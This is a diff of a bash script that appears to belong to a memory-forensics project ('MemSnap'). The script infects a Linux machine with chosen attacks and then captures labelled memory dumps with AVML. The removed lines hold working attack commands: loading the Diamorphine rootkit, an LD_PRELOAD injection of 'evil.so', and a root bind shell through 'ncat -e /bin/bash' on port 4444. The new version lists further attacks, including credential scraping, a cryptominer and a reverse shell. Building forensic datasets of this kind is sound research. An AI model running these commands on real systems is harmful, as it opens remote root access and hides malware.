@@ -1,236 +1,116 @@
 #!/usr/bin/env bash
-
-# manage_infect - Infection & memory capture manager (rootkit+injection pre-built)
-
+# MemSnap infect – modular multi‑attack manager
 set -e
 
-ROOTKIT_MODULE="diamorphine"
-BACKDOOR_PORT=4444
-SLEEP_PID_FILE="/tmp/sleep_infected.pid"
-TAIL_PID_FILE="/tmp/injection_tail.pid"
-INJECTION_MARKER="/tmp/injection_marker"
-
-FLAG_ROOTKIT="/tmp/.rootkit_active"
-FLAG_INJECTION="/tmp/.injection_active"
-FLAG_BACKDOOR="/tmp/.backdoor_active"
-
-AVML_DOWNLOAD_DIR="$HOME/.local/bin"
-AVML_DOWNLOAD_PATH="$AVML_DOWNLOAD_DIR/avml"
-AVML_URL="https://github.com/microsoft/avml/releases/download/v0.14.0/avml"
-AVML_PATH=""
-
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
-MODULE_PATH="$SCRIPT_DIR/../assets/diamorphine.ko"
-INJECT_LIB="$SCRIPT_DIR/../assets/evil.so"
+ATTACKS_DIR="$SCRIPT_DIR/attacks"
+export ASSETS_DIR="$SCRIPT_DIR/../assets"
 
-# --- Helpers ---
-is_module_active() {
-    [ -d "/sys/module/${ROOTKIT_MODULE}" ]
-}
-
-install_rootkit() {
-    if [ -f "$FLAG_ROOTKIT" ]; then
-        echo "[*] Rootkit already installed (flag)."
-        return 0
-    fi
-    if is_module_active; then
-        echo "[*] Rootkit appears to be already loaded (detected via /sys)."
-        touch "$FLAG_ROOTKIT"
-        return 0
-    fi
-
-    if [ ! -f "$MODULE_PATH" ]; then
-        echo "[!] Pre-built rootkit module not found at $MODULE_PATH"
-        echo "[!] Build it with: cd tools/diamorphine && make"
-        exit 1
-    fi
-
-    sudo insmod "$MODULE_PATH"
-    sudo kill -31 1
-    touch "$FLAG_ROOTKIT"
-    echo "[+] Rootkit loaded (pre-built)."
-}
-
-install_injection() {
-    if [ -f "$FLAG_INJECTION" ]; then
-        echo "[*] Code injection already active."
-        return 0
-    fi
-
-    if [ ! -f "$INJECT_LIB" ]; then
-        echo "[!] Pre-built library missing from assets/evil.so"
-        exit 1
-    fi
-
-    echo "INJECTION_MARKER_RAMble" > "$INJECTION_MARKER"
-
-    LD_PRELOAD="$INJECT_LIB" /usr/bin/sleep 9999 &
-    local sleep_pid=$!
-    sleep 1
-    echo "$sleep_pid" > "$SLEEP_PID_FILE"
-    echo "[+] Code injected (LD_PRELOAD) into PID $sleep_pid"
-
-    tail -f "$INJECTION_MARKER" >/dev/null 2>&1 &
-    local tail_pid=$!
-    echo "$tail_pid" > "$TAIL_PID_FILE"
-    echo "[+] Marker sentinel PID $tail_pid holding $INJECTION_MARKER open"
-
-    touch "$FLAG_INJECTION"
-}
-
-install_backdoor() {
-    if [ -f "$FLAG_BACKDOOR" ]; then
-        echo "[*] Backdoor already active."
-        return 0
-    fi
-
-    sudo pkill -f "ncat.*-l.*-p ${BACKDOOR_PORT}" 2>/dev/null || true
-    sudo apt install -y ncat 2>/dev/null
-    sudo ncat -l -k -p $BACKDOOR_PORT -e /bin/bash &
-    touch "$FLAG_BACKDOOR"
-    echo "[+] Bind shell on port $BACKDOOR_PORT"
-}
-
-clean_rootkit() {
-    sudo rmmod "$ROOTKIT_MODULE" 2>/dev/null || \
-    [ -d "/sys/module/${ROOTKIT_MODULE}" ] && sudo rmmod --force "$ROOTKIT_MODULE" 2>/dev/null || true
-
-    if [ -d "/sys/module/${ROOTKIT_MODULE}" ]; then
-        echo "[!] Rootkit module could not be removed - a reboot may be required."
-    else
-        echo "[+] Rootkit removed."
-    fi
-    rm -f "$FLAG_ROOTKIT"
-}
-
-clean_injection() {
-    [ -f "$SLEEP_PID_FILE" ] && {
-        pid=$(cat "$SLEEP_PID_FILE")
-        ps -p "$pid" > /dev/null 2>&1 && sudo kill "$pid" 2>/dev/null || true
-        rm -f "$SLEEP_PID_FILE"
-    }
-    [ -f "$TAIL_PID_FILE" ] && {
-        tail_pid=$(cat "$TAIL_PID_FILE")
-        ps -p "$tail_pid" > /dev/null 2>&1 && kill "$tail_pid" 2>/dev/null || true
-        rm -f "$TAIL_PID_FILE"
-    }
-    rm -f "$INJECTION_MARKER" "$FLAG_INJECTION"
-    echo "[+] Injection cleaned."
-}
-
-clean_backdoor() {
-    pid=$(pgrep -f "ncat.*-l.*-p ${BACKDOOR_PORT}" 2>/dev/null || true)
-    [ -n "$pid" ] && sudo kill -9 "$pid" 2>/dev/null || true
-    rm -f "$FLAG_BACKDOOR"
-    echo "[+] Backdoor cleaned."
-}
-
-parse_components() {
-    local input="$1"
-    [ "$input" = "all" ] && echo "rootkit injection backdoor" || echo "${input//,/ }"
-}
-
-active_components() {
-    local comps=()
-    [ -f "$FLAG_ROOTKIT" ]    && comps+=("rootkit")
-    [ -f "$FLAG_INJECTION" ]  && comps+=("injection")
-    [ -f "$FLAG_BACKDOOR" ]   && comps+=("backdoor")
-    [ ${#comps[@]} -eq 0 ]    && comps+=("clean")
-    echo "${comps[@]}"
-}
-
-ensure_avml() {
-    if command -v avml &>/dev/null; then
-        AVML_PATH="$(command -v avml)"
-        echo "[*] Using system-installed avml: $AVML_PATH"
-        return 0
-    fi
-    if [ -x "$AVML_DOWNLOAD_PATH" ]; then
-        AVML_PATH="$AVML_DOWNLOAD_PATH"
-        echo "[*] Using previously downloaded avml: $AVML_PATH"
-        return 0
-    fi
-    echo "[*] Downloading avml to $AVML_DOWNLOAD_PATH ..."
-    mkdir -p "$AVML_DOWNLOAD_DIR"
-    wget -q "$AVML_URL" -O "$AVML_DOWNLOAD_PATH"
-    chmod +x "$AVML_DOWNLOAD_PATH"
-    AVML_PATH="$AVML_DOWNLOAD_PATH"
-    echo "[+] AVML installed at $AVML_PATH"
-}
-
-capture_memory() {
-    local out_dir="$1"
-    ensure_avml
-    local timestamp=$(date +%Y%m%d_%H%M%S)
-    local comps=( $(active_components) )
-    local IFS=_
-    local name="memdump_${timestamp}_${comps[*]}.raw"
-    local full_path="${out_dir}/${name}"
-    mkdir -p "$out_dir"
-    echo "[*] Capturing memory to $full_path ..."
-    sudo "$AVML_PATH" --compress "$full_path"
-    echo "[+] Memory dump saved: $full_path"
-}
-
-show_status() {
-    local comps=( $(active_components) )
-    if [ "${comps[0]}" = "clean" ]; then
-        echo "[+] Machine is clean."
-    else
-        echo "[!] Active malware components: ${comps[*]}"
-    fi
-}
-
-# --- Main ---
-USAGE="Usage: $0 [-i [components] | -c [components] | -s] [-a [output_dir]]"
-
+INSTALL_COMPLETION=false
 ACTION=""
 CAPTURE=false
-COMPONENTS="all"
 OUTPUT_DIR="."
+SELECTED=()
 
-while getopts "icsa" opt; do
+usage() {
+    echo "Usage: $0 [options]"
+    echo "  -I          Install bash completion"
+    echo "  -A <attack> Add attack to queue (repeatable)"
+    echo "  -D <attack> Remove attack from queue"
+    echo "  -l          List attacks in queue"
+    echo "  -r          Run queued attacks (install)"
+    echo "  -R          Reverse queued attacks (clean)"
+    echo "  -s          Show active attacks"
+    echo "  -a [dir]    Capture memory after -r/-R (optional dir)"
+    exit 1
+}
+
+while getopts "IA:D:lrRa:s" opt; do
     case $opt in
-        i) ACTION="infect";;
-        c) ACTION="clean";;
-        s) ACTION="status";;
+        I) INSTALL_COMPLETION=true ;;
+        A) SELECTED+=("$OPTARG") ;;
+        D)
+            for i in "${!SELECTED[@]}"; do
+                [ "${SELECTED[$i]}" = "$OPTARG" ] && unset 'SELECTED[$i]'
+            done
+            ;;
+        l) echo "${SELECTED[*]:-none}"; exit 0 ;;
+        r) ACTION="install" ;;
+        R) ACTION="clean" ;;
         a) CAPTURE=true
-           [ -n "${!OPTIND}" ] && [[ "${!OPTIND}" != -* ]] && { OUTPUT_DIR="${!OPTIND}"; OPTIND=$((OPTIND+1)); };;
-        *) echo "$USAGE"; exit 1;;
+           [ -n "${!OPTIND}" ] && [[ "${!OPTIND}" != -* ]] && { OUTPUT_DIR="${!OPTIND}"; OPTIND=$((OPTIND+1)); }
+           ;;
+        s) ACTION="status" ;;
+        *) usage ;;
     esac
 done
 shift $((OPTIND-1))
 
-[ "$ACTION" = "infect" ] || [ "$ACTION" = "clean" ] && {
-    [ $# -gt 0 ] && [[ "$1" != -* ]] && { COMPONENTS="$1"; shift; }
+if $INSTALL_COMPLETION; then
+    cat > "$SCRIPT_DIR/memsnap-completion.bash" << 'EOF'
+#!/usr/bin/env bash
+_attack_list="rootkit injection backdoor reverse_shell ptrace_injection hollowing deleted_exe persistence cred_scrape cryptominer"
+_memsnap_infect_completion() {
+    local cur prev
+    _init_completion || return
+    cur="${COMP_WORDS[COMP_CWORD]}"
+    prev="${COMP_WORDS[COMP_CWORD-1]}"
+    case "$prev" in
+        -A|-D|-r|-R) COMPREPLY=( $(compgen -W "$_attack_list" -- "$cur") ); return ;;
+        *) COMPREPLY=( $(compgen -W "-l -r -R -A -D -a -s -I" -- "$cur") ); return ;;
+    esac
 }
-[ -z "$ACTION" ] && { echo "$USAGE"; exit 1; }
+complete -F _memsnap_infect_completion ./scripts/infect
+EOF
+    echo "[+] Completion script written to scripts/memsnap-completion.bash"
+    exit 0
+fi
 
-COMP_LIST=$(parse_components "$COMPONENTS")
+if [ "$ACTION" = "status" ]; then
+    active=()
+    for script in "$ATTACKS_DIR"/*; do
+        name=$(basename "$script")
+        [ -f "/tmp/.${name}_active" ] && active+=("$name")
+    done
+    [ ${#active[@]} -eq 0 ] && echo "[+] Machine is clean." || echo "[!] Active: ${active[*]}"
+    exit 0
+fi
 
-case $ACTION in
-    status)
-        show_status;;
-    infect)
-        for comp in $COMP_LIST; do
-            case $comp in
-                rootkit)   install_rootkit;;
-                injection) install_injection;;
-                backdoor)  install_backdoor;;
-                *) echo "Unknown component: $comp"; exit 1;;
-            esac
-        done
-        echo "[+] Infection complete.";;
-    clean)
-        for comp in $COMP_LIST; do
-            case $comp in
-                rootkit)   clean_rootkit;;
-                injection) clean_injection;;
-                backdoor)  clean_backdoor;;
-                *) echo "Unknown component: $comp"; exit 1;;
-            esac
-        done
-        echo "[+] Cleanup complete.";;
-esac
+[ -z "$ACTION" ] && usage
+[ ${#SELECTED[@]} -eq 0 ] && { echo "[!] No attacks selected. Use -A." >&2; exit 1; }
 
-$CAPTURE && capture_memory "$OUTPUT_DIR"
+for attack in "${SELECTED[@]}"; do
+    script="$ATTACKS_DIR/$attack"
+    [ -x "$script" ] || { echo "[!] Unknown attack: $attack" >&2; exit 1; }
+    source "$script"
+    if [ "$ACTION" = "install" ]; then
+        install_$attack
+    else
+        clean_$attack
+    fi
+done
+
+echo "[+] $ACTION complete."
+
+if $CAPTURE; then
+    AVML_DIR="$HOME/.local/bin"
+    AVML_BIN="$AVML_DIR/avml"
+    [ -x "$AVML_BIN" ] || {
+        mkdir -p "$AVML_DIR"
+        wget -q "https://github.com/microsoft/avml/releases/download/v0.14.0/avml" -O "$AVML_BIN"
+        chmod +x "$AVML_BIN"
+    }
+    ts=$(date +%Y%m%d_%H%M%S)
+    comps=()
+    for script in "$ATTACKS_DIR"/*; do
+        name=$(basename "$script")
+        [ -f "/tmp/.${name}_active" ] && comps+=("$name")
+    done
+    [ ${#comps[@]} -eq 0 ] && comps=("clean")
+    IFS=_
+    filename="memdump_${ts}_${comps[*]}.raw"
+    mkdir -p "$OUTPUT_DIR"
+    echo "[*] Capturing to $OUTPUT_DIR/$filename ..."
+    sudo "$AVML_BIN" --compress "$OUTPUT_DIR/$filename"
+    echo "[+] Dump saved."
+fi
